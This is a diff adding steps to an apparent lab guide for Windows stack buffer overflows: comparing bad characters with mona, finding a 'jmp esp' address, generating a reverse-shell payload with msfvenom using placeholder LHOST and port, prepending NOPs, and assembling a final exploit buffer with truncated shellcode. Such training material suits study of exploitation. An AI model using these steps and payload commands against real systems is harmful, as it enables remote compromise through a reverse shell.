@@ -191,4 +191,55 @@ Restart Immunity and run the exploit.py again. Then, use the mona compare comman
 !mona compare -f C:\mona\appname\bytearray.bin -a <address> (ESP address and remember change the path of the appin "appname")
 ```
 
+Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
+
+
+### 4. Finding a Jump Point
+Find a jump point (Search de addres to set on the exploit in the "retn" part).
+The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.
+
+```
+!mona jmp -r esp -cpb "\x00\x0a\x0d" (change "\x00\x0a\x0d" value)
+```
+
+### 5. Generate Shell Code
+
+Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f c
+```
+or
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f python
+```
+
+
+Prepend NOPs
+============
+
+If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.
+
+```
+padding = "\x90" * 16
+```
+
+Final Buffer
+============
+
+```
+ prefix = ""
+ offset = 112
+ overflow = "A" * offset
+ retn = "\x56\x23\x43\x9A" # Jump Poit Found
+ padding = "\x90" * 16 # NOPs
+ payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..." #Shell Code script generated
+ postfix = ""
+    
+ buffer = prefix + overflow + retn + padding + payload + postfix
+
+
+# 1. Exploit it!
+
 
